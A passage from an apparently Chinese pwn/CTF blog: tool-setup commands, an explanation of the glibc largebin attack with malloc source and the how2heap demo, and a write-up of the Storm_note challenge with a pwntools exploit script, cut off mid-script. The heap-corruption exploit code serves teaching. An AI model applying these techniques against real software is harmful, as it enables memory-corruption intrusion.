<h3 id="安装LibcSearcher"><a class="header-anchor" href="#安装LibcSearcher">¶</a>安装LibcSearcher</h3>
<pre><code>sudo pip3 install LibcSearcher
sudo pip3 install -U LibcSearcher
</code></pre>
<h3 id="安装main-arena-offset"><a class="header-anchor" href="#安装main-arena-offset">¶</a>安装main_arena_offset</h3>
<pre><code>git clone https://github.com/dev2ero/py_main_arena_offset.git
cd py_main_arena_offset
sudo python3 setup.py develop
</code></pre>
<p>食用方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pymao <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">main_arena_offset = gmao( libc )</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_offset))</span><br></pre></td></tr></table></figure>
<h3 id="安装本地调试不同版本的libc环境"><a class="header-anchor" href="#安装本地调试不同版本的libc环境">¶</a>安装本地调试不同版本的libc环境</h3>
<p>glibc-all-in-one</p>
<pre><code>git clone https://github.com/matrix1001/glibc-all-in-one.git
cd glibc-all-in-one
python3 update_list
cat list
 ./download [libc-version]
</code></pre>
<p>patchelf</p>
<pre><code>git clone https://github.com/NixOS/patchelf.git
cd patchelf
sudo apt-get install autoconf automake libtool
./bootstrap.sh
./configure
make
sudo make install
</code></pre>
<p>食用方法</p>
<pre><code>patchelf --replace-needed libc.so.6 [your-libc-path] [yourelf]
patchelf --set-interpreter [libc-ld-path] [elf]
cp -r ~/Desktop/glibc-all-in-one/libs/[libcfolderpath]/.debug/ ./debug
gdb [elf]
# set debug-file-directory ./debug/
如果要debug不同版本的libc的程序具体可以看这篇博客：https://bbs.pediy.com/thread-254868.htm
如果上述博客中方法不可行，则可以修改~/pwndbg/pwndbg/symbol.py 最后两行为set_directory('./debug/')
</code></pre>
<h3 id="安装并配置python2"><a class="header-anchor" href="#安装并配置python2">¶</a>安装并配置python2</h3>
<pre><code>#安装
sudo apt install python2 
#设置优先级
sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1 
sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.8 2
#手动切换
sudo update-alternatives --config python
#安装pip及依赖
sudo apt install  python-dev git libssl-dev libffi-dev build-essential
sudo apt-get install curl
sudo curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python get-pip.py
pip install pwntoola
</code></pre>
<h3 id="安装alpha3"><a class="header-anchor" href="#安装alpha3">¶</a>安装alpha3</h3>
<pre><code>git clone https://github.com/TaQini/alpha3.git
cd alpha3
python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc.bin&quot; &gt; out.bin
</code></pre>
<h3 id="搭建docker用的镜像"><a class="header-anchor" href="#搭建docker用的镜像">¶</a>搭建docker用的镜像</h3>
<pre><code>https://github.com/DASCTF-Base
</code></pre>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn笔记</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>largebin attack</title>
    <url>/2021/10/20/attack/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/20.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言.</h2>
<p>最近刷题遇到好几道需要large bin attack的题目，且一些漏洞联合利用的方式也要用到large bin attack 故写此博客记录</p>
<h2 id="认识largebin"><a class="header-anchor" href="#认识largebin">¶</a>认识largebin</h2>
<p>先通过一个简单的demo来认识largebin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> * a = <span class="built_in">malloc</span>(<span class="number">0x430</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">int</span> * b = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">int</span> * c = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/8b80u3zx6g5mplinjtxv2z85/1.png" alt="1.png-136.7kB"></p>
<p>根据上图，可以得出，每一个largebin链表中，堆块以从小到大的顺序排列，且fd指针总是指向比自己大的堆块（最后一个除外），相较于其他的bin多出来fd_nextsize  和 bk_nextsize 指针。</p>
<p>largebin图解<br>
<img src="http://static.zybuluo.com/hgggg/8bj2tnlhakh8e99uug0wjvxy/2.png" alt="2.png-139.3kB"></p>
<h2 id="2-23-mallac-源码解析"><a class="header-anchor" href="#2-23-mallac-源码解析">¶</a>2.23 mallac 源码解析</h2>
<p>下面实在2.23下的有关largebin 的部分源码，glibc2.27和glibc2.23相似，只是的多了有关tacahe的判断</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index); </span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>这段代码是判断将chunk从unsorted bin中脱离出来进入到所属bin的过程，如果chunk的大小在0x400以上，就会把chunk分配到largebin中</p>
<p>接下来就是关键： 由于largebin中需要满足chunk从小到大等顺序排列，所以当一个chunk归入largebin时，会存在一个解链的操作</p>
<p>在代码的110行到第113行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
<p>当解链的时候会有victim-&gt;bk_nextsize-&gt;fd_nextsize = victim 即 fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</p>
<p>而在最后有</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>可以看到bck-&gt;fd = victim,即fwd-&gt;bk-&gt;fd = victim</p>
<p>综上，如果可以控制bk和bk_nextsize的值，就可以实现任意地址写</p>
<h2 id="how2heap-largebin-attack-for-2-23"><a class="header-anchor" href="#how2heap-largebin-attack-for-2-23">¶</a>how2heap largebin attack for 2.23</h2>
<p>代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc large_bin_attack.c -o large_bin_attack -g</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;  <span class="comment">//p2-&gt;size</span></span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;       <span class="comment">//p2-&gt;fd</span></span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;       <span class="comment">//p2-&gt;fd_nextsize</span></span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);  <span class="comment">//p2-&gt;bk</span></span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);  <span class="comment">//p2-&gt;bk_nextsize</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序分析</p>
<p>Step0: 定义stack_var1,stack_var2并且赋值为0</p>
<p>Step1: 申请p1=0x320,p2=0x400,p3=0x400</p>
<p>Step2: 释放掉p1,p2进入unsorted bin</p>
<p>Step3: 申请p4=0x90,此时发生unsorted bin遍历，从p1切割0xa0大小分配给p4,同时由于p2&gt;0x3f0,直接进入largebin</p>
<p>Step4: 释放p3进入unsorted bin</p>
<p>Step5: 修改p2的size=0x3f1,fd,fd_nextsize=0,p2-&gt;bk=&amp;stack_var1-2(stack_var1即为fake chunk1的fd),p2-&gt;bk_nextsize=&amp;stack_var2-4(stack_var2即为fake chunk2的fd_nextsize)</p>
<p>Step6：malloc(0x90),发生unsorted bin遍历,从p1分割0xa0,p3&gt;0x3f0且p3&gt;p2,会进行解链操作即p2-&gt;bk_nextsize-&gt;fd_nextsize = p3,p2-&gt;bk-&gt;fd=p3，即向fake chunk1的fd 和 fake chunk2的fd_nextszie , 写入了p3头指针的值，即将stack_var1 和 stack_va2修改为了p3的头指针</p>
<h2 id="列题1"><a class="header-anchor" href="#列题1">¶</a>列题1</h2>
<h3 id="2019西湖论剑Storm-note"><a class="header-anchor" href="#2019西湖论剑Storm-note">¶</a>2019西湖论剑Storm_note</h3>
<h4 id="题目考点"><a class="header-anchor" href="#题目考点">¶</a>题目考点</h4>
<pre><code>1.largebin attack
2.chunk overlap
3.off by null
</code></pre>
<p>本题所衍生的一系列漏洞利用方法，也就是house of storm</p>
<h4 id="题目分析"><a class="header-anchor" href="#题目分析">¶</a>题目分析</h4>
<p>init<br>
<img src="http://static.zybuluo.com/hgggg/nuka4g6wb1f0exchdwyek2r9/3.png" alt="3.png-39.4kB"><br>
add<br>
<img src="http://static.zybuluo.com/hgggg/x0ce4dol8bgv4y7hfke8dumj/4.png" alt="4.png-32.4kB"><br>
add函数用的是calloc,与malloc不同，calloc会对申请到的空间做初始化操作<br>
edit<br>
<img src="http://static.zybuluo.com/hgggg/gue1ojamwlxa8046dvxgyi0x/image_1fieomqgj1st9rdh4c5qkqn99.png" alt="image_1fieomqgj1st9rdh4c5qkqn99.png-37.2kB"><br>
（(_BYTE )(note[v1] + v2) = 0;）存在off by null<br>
backdoor<br>
<img src="http://static.zybuluo.com/hgggg/kf4kzl4bbz4b4r8d7xyz7y81/image.png" alt="image.png-19.4kB"><br>
当条件满足时可以getshell</p>
<h4 id="解题步骤"><a class="header-anchor" href="#解题步骤">¶</a>解题步骤</h4>
<p>Step1：构造overlap chunk</p>
<p>申请堆块如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#6</span></span><br></pre></td></tr></table></figure>
<p>其中chunk2，chunk4是我们等下需要利用overlap控制的chunk，chunk6为了防止堆块合并</p>
<p>overlapping</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit(1,b&#x27;a&#x27;*0x4f0+p64(0x500)) #修改prve_size，确保堆块的合法性</span><br><span class="line">free(1)</span><br><span class="line">edit(0,b&#x27;a&#x27;*0x18) #off by null</span><br><span class="line">add(0x18)    #1</span><br><span class="line">add(0x4d8)   #7 </span><br><span class="line">free(1)</span><br><span class="line">free(2)   </span><br><span class="line">add(0x30)   #1</span><br><span class="line">add(0x4e0)  #2</span><br></pre></td></tr></table></figure>
<p>此时，可以通过chunk7,来控制chunk2中的内容</p>
<p>梅开二度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>) <span class="comment">#off by null</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8 </span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)       <span class="comment">#overlap</span></span><br><span class="line">add(<span class="number">0x40</span>)     <span class="comment">#4</span></span><br></pre></td></tr></table></figure>
<p>这里add(0x40)是为了等下large chunk的大小不同触发解链操作</p>
<p>Step2 largebin attack</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">2</span>)   </span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">free(<span class="number">2</span>) </span><br></pre></td></tr></table></figure>
<p>当add(0x4e8)时，会发生unsorted bin的遍历，由于0x4e8&gt;chunk4=0x4e0，会继续向后遍历，因为chunk2=0x4f0,刚好满足条件，所以chunk2会被申请出来，而chunk4则会被放入largebin,让后再将chunk2放入unsorted bin二次利用</p>
<p>伪造fake chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content_addr = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)      </span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)   </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)</span><br></pre></td></tr></table></figure>
<p>由于伪造unsorted bin 的 bk时，我们故意向上偏移了0x20字节，所以得到的size就是0，由于不够申请的size，转而进入large bin 判断部分。然后进行一系列的链接操作。最后我们会分配到0xabcd00f0 地址。</p>
<p>为什么要伪造p64(fake_chunk-0x18-5): 由于victim-&gt;bk_nextsize的地址就是(size_t)fake_chunk - 0x18 - 5的值，那么就相当于我们有一次任意地址写的机会，那么肯定是用来构造我们的size，以便在第二次解链的时候直接返回任意chunk。<br>
0x18就是一个chunk的fd_nextsize的偏移，因为上面的代码是要把victim写在这里，所以我们需要提取向前偏移0x18，而- 5就是为了伪造size，在开启PIE的情况下，一般victim的值在0x555555756000附近左右，当偏移5个字节之后，那么写入size的地址就刚好是0x55，由于受随机化的影响这个值会稍微有点变动。（摘自EX师傅的博客）</p>
<p>下图为我们申请到的fake chunk,其size为是0x56,经过malloc对其后其size会被对齐为0x50，所以我们add的时候要在0x40~0x48之间<br>
<img src="http://static.zybuluo.com/hgggg/o7h2sh44ip7kpyk8qy56eok8/image_1fignpogf1l341uj3ab51slmo059.png" alt="image_1fignpogf1l341uj3ab51slmo059.png-32.8kB"></p>
<p>Step3 修改随机数，getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span>+p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>)*<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<h4 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;Storm_note&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;Storm_note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size ?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index ?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index ?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">lock</span>):</span></span><br><span class="line">    choice(<span class="number">666</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;in\n&quot;</span>)</span><br><span class="line">    p.sendline(lock)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>)) <span class="comment">#修改prve_size，确保堆块的合法性</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>) <span class="comment">#off by null</span></span><br><span class="line">add(<span class="number">0x18</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)   <span class="comment">#7 </span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)   </span><br><span class="line">add(<span class="number">0x30</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e0</span>)  <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>) <span class="comment">#off by null</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span 